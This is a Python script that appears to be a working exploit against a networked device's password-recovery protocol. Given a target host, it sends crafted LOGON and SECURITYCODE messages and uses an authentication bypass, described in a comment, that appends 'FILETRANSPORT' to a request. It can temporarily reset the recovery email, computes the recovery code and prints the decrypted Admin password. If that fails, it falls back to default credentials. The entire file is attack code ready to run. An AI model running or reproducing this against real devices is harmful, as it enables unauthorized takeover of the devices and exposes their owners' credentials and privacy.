import sys
import hashlib
import base64

from lib import decode, Channel
from lib.crypt import td_decrypt

def main():
  if len(sys.argv) != 2:
    print('python3 %s [host]' % sys.argv[0], file=sys.stderr)
    exit(1)
    
  host = sys.argv[1]
  
  conn = Channel(host)
  conn.connect()

  # modified get key packet
  crypt_key = conn.get_crypt_key(65536)

  # we need to send a modified logon message which should tigger a FINDPSW response
  # then compute the code to use with the SECURITYCODE command

  # we repeat this since the code we'll send depends on the current minute, so in rare cases that could change between requests
  
  attempts = 2
  tried_to_set_mail = False
  ok = False
  
  while attempts > 0:
    attempts -= 1
  
    code = get_psw_code(conn)
    
    if code == False:
      # psw not supported
      break
          
    elif code == None:
      if not tried_to_set_mail:
        print("no psw data found, we'll try to set it", file=sys.stderr)
        
        tried_to_set_mail = True
        if try_set_mail(conn, 'a@a.a'):
          code = get_psw_code(conn)
    
    if code == None:
      print("couldn't set mail", file=sys.stderr)
      break
      
    rcode, password = recover_with_code(conn, code, crypt_key)

    if rcode == 5:
      # this mechanism also participates in the failed login attempts limit
      # which locks the device down for 30 minutes
        
      print('The device is locked, try again later.', file=sys.stderr)
      break
    
    if rcode == 0:
      print('Admin', password)
      ok = True
      break           
             
  if tried_to_set_mail:
    try_set_mail(conn, '')
  
  if not code:
    print("psw is not supported, trying default credentials", file=sys.stderr)
    
    credentials = recover_with_default(conn, crypt_key)
    
    if credentials:
      user, pw = credentials
      print(user, pw)
    
      ok = True
    
  if not ok:
    print('Recovery failed', file=sys.stderr)
    exit(1)


# old versions of the firmware expect this to be done after authentication, but this can be bypassed by appending a "FILETRANSPORT" somewhere. newer versions don't need this

def try_set_mail(conn, target):
  conn.send_msg(['PROXY', 'USER', 'RESERVEPHONE', '2', '1', target, 'FILETRANSPORT'])
  resp = conn.recv_msg()

  return resp[4:7] == ['RESERVEPHONE', '2', '1']

def get_psw_code(conn):
  conn.send_msg(['IP', 'USER', 'LOGON', base64.b64encode(b'Admin').decode(), base64.b64encode(b'Admin').decode(), '', '65536', 'UTF-8', '0', '1'])
  resp = conn.recv_msg()
  
  if resp[4] != 'FINDPSW':
    return False

  psw_reg = psw_data = None
  
  if len(resp) > 7:
    psw_reg = resp[6]
    psw_data = resp[7]

  if not psw_data:
    return None
  
  psw_type = int(resp[5])
  
  if psw_type not in (1, 2, 3):
    raise Exception('unsupported psw type: '+str(psw_type))

  if psw_type == 3:
    psw_data = psw_data.split('"')[3]

  if psw_type == 1:
    psw_data = psw_data.split(':')[1]
    psw_key = psw_reg[:0x1f]
  
  elif psw_type in (2, 3):
    psw_key = psw_reg[:4].lower()

  psw_code = td_decrypt(psw_data.encode(), psw_key.encode())    
  code = hashlib.md5(psw_code).hexdigest()[24:]
  
  return code
  
  
def recover_with_code(conn, code, crypt_key):
  conn.send_msg(['IP', 'USER', 'SECURITYCODE', code, 'FILETRANSPORT'])
  resp = conn.recv_msg()

  rcode = int(resp[6])

  if rcode == 0:
    return rcode, decode(resp[8].encode(), crypt_key).decode()

  return rcode, None
  

def recover_with_default(conn, crypt_key):
  res = conn.login_with_key(b'Default', b'Default', crypt_key)
  if not res:
    return False

  while True:
    msg = conn.recv_msg()
  
    if msg[1:5] == ['IP', 'INNER', 'SUPER', 'GETUSERINFO']:
      return decode(msg[6].encode(), crypt_key).decode(), decode(msg[7].encode(), crypt_key).decode()

if __name__ == '__main__':
    main()
